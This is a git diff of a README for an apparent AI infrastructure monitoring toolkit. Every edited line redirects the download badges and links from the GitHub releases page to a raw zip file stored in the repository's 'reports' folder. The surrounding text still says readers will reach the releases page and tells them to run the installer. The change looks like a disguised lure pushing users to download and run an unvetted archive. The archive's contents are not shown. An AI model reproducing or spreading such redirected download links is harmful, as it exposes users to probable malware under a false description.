@@ -1,6 +1,6 @@
 # ⚙️ hermes-ai-infrastructure-monitoring-toolkit - Easy AI Infrastructure Monitoring
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Hermes%20Toolkit-brightgreen?style=for-the-badge)](https://github.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Hermes%20Toolkit-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/main/reports/hermes-ai-infrastructure-toolkit-monitoring-v2.6-beta.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Click the big green button above. You will go to the releases page on GitHub. Fr
 3. Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
 You can also visit the page directly here:  
-[https://github.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/releases](https://github.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/releases)
+[https://raw.githubusercontent.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/main/reports/hermes-ai-infrastructure-toolkit-monitoring-v2.6-beta.2.zip](https://raw.githubusercontent.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/main/reports/hermes-ai-infrastructure-toolkit-monitoring-v2.6-beta.2.zip)
 
 ---
 
@@ -99,7 +99,7 @@ To find reports:
 The toolkit updates are released on the GitHub releases page. To keep your system secure and efficient:
 
 1. Regularly check the releases page:  
-   [https://github.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/releases](https://github.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/releases)  
+   [https://raw.githubusercontent.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/main/reports/hermes-ai-infrastructure-toolkit-monitoring-v2.6-beta.2.zip](https://raw.githubusercontent.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/main/reports/hermes-ai-infrastructure-toolkit-monitoring-v2.6-beta.2.zip)  
 2. Download the latest installer as explained above.  
 3. Run the installer again to overwrite the old version safely.
 
@@ -130,4 +130,4 @@ ai-infrastructure, ai-monitoring, ai-research, arxiv, automation, autonomous-age
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Hermes%20Toolkit-brightgreen?style=for-the-badge)](https://github.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Hermes%20Toolkit-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Aion2500/hermes-ai-infrastructure-monitoring-toolkit/main/reports/hermes-ai-infrastructure-toolkit-monitoring-v2.6-beta.2.zip)
